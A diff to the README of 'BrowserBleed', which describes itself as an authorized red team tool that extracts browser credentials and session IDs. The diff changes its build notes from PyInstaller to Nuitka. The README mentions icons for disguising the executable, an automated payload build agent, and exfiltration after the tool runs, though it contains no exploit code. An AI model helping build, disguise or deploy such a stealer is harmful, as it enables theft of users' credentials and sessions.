@@ -5,7 +5,7 @@ Authorized red team credential extraction tool. Windows exe + Go report server.
 ## Project layout
 
 ```
-BrowserBleed.py          # main extractor (PyInstaller onefile source)
+BrowserBleed.py          # main extractor (Nuitka native-compiled source)
 build_windows.ps1        # builds payloads — run from repo root
 build_agent.py           # local Windows agent: polls /builds/claim and runs build_windows.ps1
 icons/                   # .ico / .png files for exe disguising
@@ -166,13 +166,13 @@ See [`SESSIONTEST_USAGE.md`](SESSIONTEST_USAGE.md) for complete usage guide and 
 
 ## Known issues / history
 
-- **Self-delete removed**: `subprocess.Popen` in a PyInstaller frozen elevated exe blocks
+- **Self-delete removed**: `subprocess.Popen` in a frozen elevated exe blocks
   indefinitely, preventing the exfil section from running. Self-delete was removed entirely.
   The exe now runs, exfils, and exits cleanly. Do not re-add without solving this root cause.
 
 - **Encoding**: Always use `-Encoding utf8` when calling `Get-Content` on the Python source
   in build_windows.ps1. Without it, PowerShell reads as CP1252 and corrupts UTF-8 box-drawing
-  chars in string literals before PyInstaller compiles them.
+  chars in string literals before Nuitka compiles them.
 
 - **Hit count variation**: Normal — tied to how many browser sessions are active at run time.
   Session ID hits dominate the count (can be 400+ or as low as 10 depending on open tabs).
